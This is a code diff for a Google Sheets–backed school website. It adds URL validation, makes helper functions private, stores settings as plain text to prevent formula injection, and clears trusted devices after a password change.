+    const c = v.charCodeAt(i);
+    if (c <= 32 || c === 127) return { error: '網址不能含有空白或控制字元（Tab、換行）' };
+  }
+  if (/^https?:\/\/./i.test(v)) return { value: v };
+  if (opts.allowDataImage && /^data:image\/[a-z0-9.+-]+[;,]/i.test(v)) return { value: v };
+  if (opts.allowRelative && !/^[a-z][a-z0-9+.-]*:/i.test(v) && v.indexOf('//') !== 0 && v.indexOf('\\') === -1) return { value: v };
+  return { error: '網址必須是 http:// 或 https:// 開頭' };
+}
+
 function trSafeUrl_(v) { const u = trStr_(v); return /^https?:\/\/[^\s"'<>]+$/i.test(u) ? u : ''; }
 
 /** 計畫項目：略過沒有學年度、類別、內容或種類不合法的列；依學年度、原列順序（類別第一次出現的順序）、類別內順序排列。 */
@@ -5109,8 +5250,8 @@ function parseTransitionArticles_(rows) {
 
 function getTransitionData_() {
   return {
-    plan: parseTransitionPlan_(getSheetDataAsObjects(ensureTrSheet_(TR_PLAN_SHEET, TR_PLAN_HEADERS))),
-    articles: parseTransitionArticles_(getSheetDataAsObjects(ensureTrSheet_(TR_ART_SHEET, TR_ART_HEADERS)))
+    plan: parseTransitionPlan_(getSheetDataAsObjects_(ensureTrSheet_(TR_PLAN_SHEET, TR_PLAN_HEADERS))),
+    articles: parseTransitionArticles_(getSheetDataAsObjects_(ensureTrSheet_(TR_ART_SHEET, TR_ART_HEADERS)))
   };
 }
 
@@ -5183,7 +5324,7 @@ function saveTransitionItem(itemData, password) {
     const id = targetRow === -1 ? trNewId_('TRP') : trStr_(itemData.id);
     if (targetRow === -1) targetRow = sheet.getLastRow() + 1;
     trWriteRow_(sheet, headers, targetRow, { id: id, year: t.year, category: t.category, order: order, kind: t.kind, text: t.text, updatedAt: Utilities.formatDate(new Date(), 'Asia/Taipei', 'yyyy-MM-dd') }, ['order']);
-    clearAppDataCache();
+    clearAppDataCache_();
     return { success: true, message: '銜接計畫項目已儲存！', itemId: id, order: order };
   } catch (err) {
     return { success: false, error: '儲存銜接計畫項目失敗: ' + err.toString() };
@@ -5198,7 +5339,7 @@ function trDeleteById_(sheetName, headers, id, notFound) {
   const row = trFindRow_(data, data[0].map(function(h) { return String(h).trim(); }).indexOf('id'), key);
   if (row === -1) return { success: false, error: notFound };
   sheet.deleteRow(row);
-  clearAppDataCache();
+  clearAppDataCache_();
   return { success: true, message: '已刪除！' };
 }
 
@@ -5220,7 +5361,7 @@ function copyTransitionYear(fromYear, toYear, password) {
     const data = sheet.getDataRange().getValues();
     const headers = data[0].map(function(h) { return String(h).trim(); });
     const yIdx = headers.indexOf('year');
-    const sources = parseTransitionPlan_(getSheetDataAsObjects(sheet).filter(function(r) { return trStr_(r.year) === from; }));
+    const sources = parseTransitionPlan_(getSheetDataAsObjects_(sheet).filter(function(r) { return trStr_(r.year) === from; }));
     if (sources.length === 0) return { success: false, error: '「' + from + '」沒有任何計畫項目可以複製。' };
     for (let i = 1; i < data.length; i++) if (trStr_(data[i][yIdx]) === to) return { success: false, error: '「' + to + '」已經有計畫項目，為避免重複不會覆蓋；請先刪除，或逐筆新增。' };
     if (data.length - 1 + sources.length > TR_MAX_ROWS) return { success: false, error: '銜接計畫項目已達上限（' + TR_MAX_ROWS + ' 筆），請先刪除不用的舊資料。' };
@@ -5230,7 +5371,7 @@ function copyTransitionYear(fromYear, toYear, password) {
     sources.forEach(function(t, i) {
       trWriteRow_(sheet, headers, row++, { id: 'TRP-' + stamp + '-' + ('00' + (i + 1)).slice(-3) + Utilities.getUuid().replace(/-/g, '').slice(0, 3), year: to, category: t.category, order: t.order, kind: t.kind, text: t.text, updatedAt: today }, ['order']);
     });
-    clearAppDataCache();
+    clearAppDataCache_();
     return { success: true, message: '已把「' + from + '」的 ' + sources.length + ' 個項目複製到「' + to + '」！', count: sources.length };
   } catch (err) {
     return { success: false, error: '複製銜接計畫失敗: ' + err.toString() };
@@ -5278,7 +5419,7 @@ function saveTransitionArticle(articleData, password) {
     const id = targetRow === -1 ? trNewId_('TRA') : trStr_(articleData.id);
     if (targetRow === -1) targetRow = sheet.getLastRow() + 1;
     trWriteRow_(sheet, headers, targetRow, { id: id, order: order, title: a.title, source: a.source, url: a.url, summary: a.summary, points: a.points, bubbles: a.bubbles, quote: a.quote, updatedAt: Utilities.formatDate(new Date(), 'Asia/Taipei', 'yyyy-MM-dd') }, ['order']);
-    clearAppDataCache();
+    clearAppDataCache_();
     return { success: true, message: '銜接文章已儲存！', articleId: id, order: order };
   } catch (err) {
     return { success: false, error: '儲存銜接文章失敗: ' + err.toString() };
@@ -5320,7 +5461,7 @@ function saveMobileNav(tabs, password) {
       if (list.indexOf(list[i]) !== i) return { success: false, error: '同一個頁面不能放兩次。' };
     }
     const value = list.join(',');
-    const sheet = getSpreadsheet().getSheetByName('Settings');
+    const sheet = getSpreadsheet_().getSheetByName('Settings');
     if (!sheet) return { success: false, error: '找不到 Settings 工作表' };
     const data = sheet.getDataRange().getValues();
     let row = -1;
@@ -5329,7 +5470,7 @@ function saveMobileNav(tabs, password) {
     const cell = sheet.getRange(row, 2);
     cell.setNumberFormat('@');
     cell.setValue(value);
-    clearAppDataCache();
+    clearAppDataCache_();
     return { success: true, message: '手機底部導覽列已更新！', tabs: list };
   } catch (err) {
     return { success: false, error: '儲存手機導覽列失敗: ' + err.toString() };
@@ -5382,7 +5523,7 @@ function siteTitlesFromSettings_(settings) {
 /** 目前有自訂（非空白）的欄位：[{ field, value }]，供英文對照蒐集。 */
 function siteTitleCustoms_(ss) {
   const sheet = ss ? ss.getSheetByName('Settings') : null;
-  const vals = siteTitlesFromSettings_(getSettingsObject(sheet));
+  const vals = siteTitlesFromSettings_(getSettingsObject_(sheet));
   return SITE_TITLE_FIELDS_.filter(function(f) { return vals[f.prop] !== ''; }).map(function(f) { return { field: f, value: vals[f.prop] }; });
 }
 
@@ -5410,7 +5551,7 @@ function saveSiteTitles(titles, password) {
     }
     if (!updates.length) return { success: false, error: '沒有要儲存的內容' };
 
-    const sheet = getSpreadsheet().getSheetByName('Settings');
+    const sheet = getSpreadsheet_().getSheetByName('Settings');
     if (!sheet) return { success: false, error: '找不到 Settings 工作表' };
     const data = sheet.getDataRange().getValues();
     updates.forEach(function(u) {
@@ -5426,8 +5567,8 @@ function saveSiteTitles(titles, password) {
       cell.setNumberFormat('@');   // 純文字：開頭是 = + - 的內容不會被當成公式
       cell.setValue(u[1]);
     });
-    clearAppDataCache();
-    return { success: true, message: '介面標題已更新！', titles: siteTitlesFromSettings_(getSettingsObject(sheet)) };
+    clearAppDataCache_();
+    return { success: true, message: '介面標題已更新！', titles: siteTitlesFromSettings_(getSettingsObject_(sheet)) };
   } catch (err) {
     return { success: false, error: '儲存介面標題失敗: ' + err.toString() };
   }
@@ -5452,19 +5593,21 @@ function updateSettings(newSettings, password) {
     }
   }
   try {
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     const sheet = ss.getSheetByName('Settings');
     const data = sheet.getDataRange().getValues();
 
     for (let i = 1; i < data.length; i++) {
       const key = String(data[i][0]).trim();
       if (newSettings[key] !== undefined) {
-        sheet.getRange(i + 1, 2).setValue(newSettings[key]);
+        const cell = sheet.getRange(i + 1, 2);
+        cell.setNumberFormat('@');   // 純文字：開頭是 = + - @ 的內容（包含新密碼）原樣存成文字，不會被當成公式
+        cell.setValue(newSettings[key]);
       }
     }
 
-    clearAppDataCache();
-    if (passwordChanged) bumpAuthEpoch_();   // 所有人（含目前這個登入）須以新密碼重新登入
+    clearAppDataCache_();
+    if (passwordChanged) { bumpAuthEpoch_(); clearTrustedDevices_(); }   // 所有人（含目前這個登入）須以新密碼重新登入
     return { success: true, message: passwordChanged ? '密碼已更新，請以新密碼重新登入。' : '系統設定已更新完成！', passwordChanged: passwordChanged };
   } catch (err) {
     return { success: false, error: err.toString() };
@@ -5478,8 +5621,8 @@ function updateSettings(newSettings, password) {
 /**
  * 確保 AlbumCategories 與 Albums 兩大工作表存在，若不存在則自動建立、設定格式並匯入資料
  */
-function ensureAlbumSheetsExist() {
-  const ss = getSpreadsheet();
+function ensureAlbumSheetsExist_() {
+  const ss = getSpreadsheet_();
   if (!ss) return { success: false, error: '無法開啟試算表' };
 
   let createdSheets = [];
@@ -5625,7 +5768,7 @@ function ensureAlbumSheetsExist() {
     changed = true;
   }
 
-  if (changed) clearAppDataCache();
+  if (changed) clearAppDataCache_();
   return {
     success: true,
     created: createdSheets,
@@ -5639,18 +5782,18 @@ function ensureAlbumSheetsExist() {
  * （過去 Events 只剩標題列時會自動重灌示範資料，等於活動被刪光後會被假資料覆蓋。）
  * 全新試算表的初始化只能由擁有者在試算表選單「一鍵初始化／重設資料庫」手動執行。
  */
-function ensureDatabaseInitialized() {
-  const ss = getSpreadsheet();
+function ensureDatabaseInitialized_() {
+  const ss = getSpreadsheet_();
   if (!ss) return;
 
   const eventsSheet = ss.getSheetByName('Events');
   if (!eventsSheet) {
     console.warn('Events 工作表不存在：請由試算表選單「一鍵初始化／重設資料庫」手動初始化。');
   }
-  ensureAlbumSheetsExist();
+  ensureAlbumSheetsExist_();
 }
 
-function normalizeDateString(val) {
+function normalizeDateString_(val) {
   if (!val) return '';
   if (val instanceof Date) {
     return Utilities.formatDate(val, 'Asia/Taipei', 'yyyy-MM-dd');
@@ -5664,7 +5807,7 @@ function normalizeDateString(val) {
   return str.replace(/\//g, '-');
 }
 
-function getSheetDataAsObjects(sheet) {
+function getSheetDataAsObjects_(sheet) {
   if (!sheet) return [];
   const range = sheet.getDataRange();
   const values = range.getValues();
@@ -5716,7 +5859,7 @@ function getSheetDataAsObjects(sheet) {
   return list;
 }
 
-function getSettingsObject(sheet) {
+function getSettingsObject_(sheet) {
   if (!sheet) return {};
   const values = sheet.getDataRange().getValues();
   const settings = {};
@@ -5751,7 +5894,7 @@ function menuResetDatabase() {
 
 // 結尾底線 = 私有函式，google.script.run 與網頁 API 都呼叫不到
 function setupInitialDatabase_() {
-  const ss = getSpreadsheet();
+  const ss = getSpreadsheet_();
   if (!ss) throw new Error('無法取得 Google 試算表！');
 
   // 1. Events 工作表
@@ -5936,6 +6079,6 @@ function setupInitialDatabase_() {
   });
 
   console.log('Database initialized successfully!');
-  clearAppDataCache();
+  clearAppDataCache_();
   return { success: true, message: '試算表資料庫初始化完成！' };
 }
